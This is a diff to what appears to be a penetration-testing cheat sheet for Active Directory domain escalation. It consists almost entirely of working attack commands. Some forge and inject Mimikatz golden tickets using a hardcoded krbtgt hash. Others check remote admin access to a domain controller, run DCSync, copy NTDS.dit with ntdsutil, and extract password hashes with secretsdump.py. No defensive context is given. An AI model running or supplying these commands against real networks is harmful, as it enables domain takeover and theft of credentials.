@@ -88,11 +88,19 @@ Input:
     PS> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<Domain> /sid:<SID> /krbtgt:<SID> /sids:<SID> /ptt"'
     
 
+#Create a golden ticket file if needed for backup
+    
+    PS> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<Domain> /sid:<sid> 
+        /krbtgt:f320b90fa9c53963efc61146e77022b5 /sids:<SID>"‘
+
+    PS> Invoke-Mimikatz -Command '"kerberos::ptt ticketname.bin"'
+
 #Check administrative access to the parent domain controller
     
     PS> dir \\<Domain Controller>l\c$ #Allowed
     PS> Invoke-WmiMethod -Path Win32_process -Name create -ComputerName <Computer Name> -ArgumentList calc.exe
     
+## Dump Active Directory    
 
 #Run DCSync with mimikatz
     
@@ -105,9 +113,14 @@ Input:
 
     PS> Invoke-DCSync –PWDumpFormat 
     
-#Create a golden ticket file if needed for backup
     
-    PS> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<Domain> /sid:<sid> 
-        /krbtgt:f320b90fa9c53963efc61146e77022b5 /sids:<SID>"‘
+#Most risk averse way – requires access to a DC with elevated rights
+     
+     PS> mkdir c:\temp\dump\
+     PS> NTdsutil.exe "activate instance ntds" "ifm" "create full c:\temp\dump" ""q"" ""q""
 
-    PS> Invoke-Mimikatz -Command '"kerberos::ptt ticketname.bin"'
+#Zip and download folder
+
+    secretsdump.py -system registry/SYSTEM -security registry/SECURITY -ntds
+    Active\ Directory/ntds.dit -hashes lmhash:nthash –outputfile tmp-hashes.dump
+    LOCAL   
